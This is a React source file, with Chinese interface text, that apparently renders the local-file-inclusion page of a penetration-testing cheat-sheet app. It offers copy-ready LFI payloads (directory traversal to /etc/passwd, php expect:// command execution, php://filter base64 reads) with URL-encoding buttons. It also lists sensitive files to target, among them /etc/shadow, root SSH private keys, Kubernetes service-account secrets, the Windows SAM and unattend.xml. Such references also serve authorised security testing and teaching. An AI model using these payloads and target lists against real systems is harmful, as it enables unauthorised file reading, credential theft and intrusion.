import React from 'react';
import { Button, message, Typography, Divider } from 'antd';
import { CopyOutlined, LinkOutlined } from '@ant-design/icons';
import QueueAnim from 'rc-queue-anim';
import Clipboard from 'react-clipboard.js';

const { Title, Paragraph } = Typography;

export default (props) => {
	const successInfoReverseShell = () => {
		message.success('复制成功！');
	};
	const successInfoEncodeURL = () => {
		message.success('复制成功！');
	};
	const directoryTraversal = `foo.php?file=../../../../../../../etc/passwd`;
	const phpWrapperLfi = `/s7ck.php?page=expect://ls`;
	const phpWrapperFilter = `/s7ck.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd`;
	const linux = [
		{ title: '/etc/passwd' },
		{ title: '/etc/shadow' },
		{ title: '/etc/issue' },
		{ title: '/etc/group' },
		{ title: '/etc/hostname' },
		{ title: '/etc/ssh/ssh_config' },
		{ title: '/etc/ssh/sshd_config' },
		{ title: '/root/.ssh/id_rsa' },
		{ title: '/root/.ssh/authorized_keys' },
		{ title: '/home/user/.ssh/authorized_keys' },
		{ title: '/home/user/.ssh/id_rsa' },
		{ title: '/proc/[0-9]*/fd/[0-9]*' },
		{ title: '/proc/mounts' },
		{ title: '/home/$USER/.bash_history' },
		{ title: '/home/$USER/.ssh/id_rsa' },
		{ title: '/var/run/secrets/kubernetes.io/serviceaccount' },
		{ title: '/var/lib/mlocate/mlocate.db' },
		{ title: '/var/lib/mlocate.db' }
	];
	const apache = [
		{ title: '/etc/apache2/apache2.conf' },
		{ title: '/usr/local/etc/apache2/httpd.conf' },
		{ title: '/etc/httpd/conf/httpd.conf' },
		{ title: 'Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log' },
		{ title: 'Debian/Ubuntu -> /var/log/apache2/access.log' },
		{ title: 'FreeBSD -> /var/log/httpd-access.log' },
		{ title: '/var/log/apache/access.log' },
		{ title: '/var/log/apache/error.log' },
		{ title: '/var/log/apache2/access.log' },
		{ title: '/var/log/apache/error.log' }
	];
	const mysql = [
		{ title: '/var/lib/mysql/mysql/user.frm' },
		{ title: '/var/lib/mysql/mysql/user.MYD' },
		{ title: '/var/lib/mysql/mysql/user.MYI' }
	];
	const windows = [
		{ title: '/boot.ini' },
		{ title: '/autoexec.bat' },
		{ title: '/windows/system32/drivers/etc/hosts' },
		{ title: '/windows/repair/SAM' },
		{ title: '/windows/panther/unattended.xml' },
		{ title: '/windows/panther/unattend/unattended.xml' },
		{ title: '/windows/system32/license.rtf' },
		{ title: '/windows/system32/eula.txt' }
	];
	return (
		<QueueAnim delay={300} duration={1500}>
			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
				LFI
			</Title>
			<Paragraph style={{ margin: 15 }}>
			LFI代表“本地文件包含”-这是一个文件本地包含漏洞，攻击者可以利用该漏洞包含目标Web服务器上存在的文件。
			</Paragraph>
			<Paragraph style={{ marginLeft: 15 }}>
				通常，这是通过滥用动态文件包含机制来进行的，这些机制不会对用户输入进行检查。
			</Paragraph>
			<Divider dashed />
			<div style={{ padding: 10, marginTop: 15 }} key='a'>
				<Title level={3}>目录遍历</Title>
				<Paragraph copyable ellipsis={true}>
					{directoryTraversal}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={directoryTraversal}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined /> 复制
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(directoryTraversal)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL编码
					</Button>
				</Clipboard>
			</div>
			<Divider dashed />
			<div
				key='b'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Title level={3}>PHP Wrapper  php://file</Title>
				<Paragraph copyable ellipsis={true}>
					{phpWrapperLfi}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={phpWrapperLfi}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined />
						复制
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(phpWrapperLfi)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined />URL编码
					</Button>
				</Clipboard>
			</div>
			<Divider dashed />
			<div
				key='c'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Title level={3}>PHP Wrapper php://filter</Title>
				<Paragraph copyable ellipsis={true}>
					{phpWrapperFilter}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={phpWrapperFilter}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined />
					复制
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(phpWrapperFilter)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL编码
					</Button>
				</Clipboard>
			</div>
			<Divider dashed />
			<div
				key='d'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Title level={3}>常见目录</Title>
				<Title level={4}>Linux</Title>
				{linux.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
				<Divider dashed />
				<Title level={4}>Apache</Title>
				{apache.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
				<Divider dashed />
				<Title level={4}>MySQL</Title>
				{mysql.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
				<Divider dashed />
				<Title level={4}>Windows</Title>
				{windows.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
		</QueueAnim>
	);
};
